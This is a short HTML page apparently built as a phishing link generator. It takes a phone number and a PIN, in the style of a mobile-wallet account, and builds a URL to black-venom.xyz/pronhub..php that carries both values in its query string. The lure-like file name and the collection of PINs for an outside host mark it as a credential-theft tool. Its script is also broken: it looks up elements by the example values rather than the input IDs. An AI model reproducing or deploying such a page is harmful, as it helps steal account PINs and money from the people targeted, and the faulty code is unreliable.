<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>Link Generator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      padding: 40px;
      text-align: center;
    }
    input, button {
      padding: 10px;
      font-size: 16px;
      margin: 10px;
    }
    a {
      display: block;
      margin-top: 20px;
      font-size: 18px;
      color: blue;
    }
  </style>
</head>
<body>
  <h2>📱 Dynamic Link Generator</h2>

  <input type="text" id="number" placeholder="Enter Number e.g. 0175873027"><br>
  <input type="text" id="pin" placeholder="Enter PIN e.g. 2580"><br>
  <button onclick="generateLink()">Generate Link</button>

  <a id="generatedLink" href="#" target="_blank"></a>

  <script>
    function generateLink() {
      const number = document.getElementById('0175873027').value;
      const pin = document.getElementById('2580').value;

      if (number && pin) {
        const link = `https://black-venom.xyz/pronhub..php?number=${encodeURIComponent(number)}&pin=${encodeURIComponent(pin)}`;
        const linkElement = document.getElementById('generatedLink');
        linkElement.href = link;
        linkElement.textContent = link;
      } else {
        alert("0175873027 2580");
      }
    }
  </script>
</body>
</html>
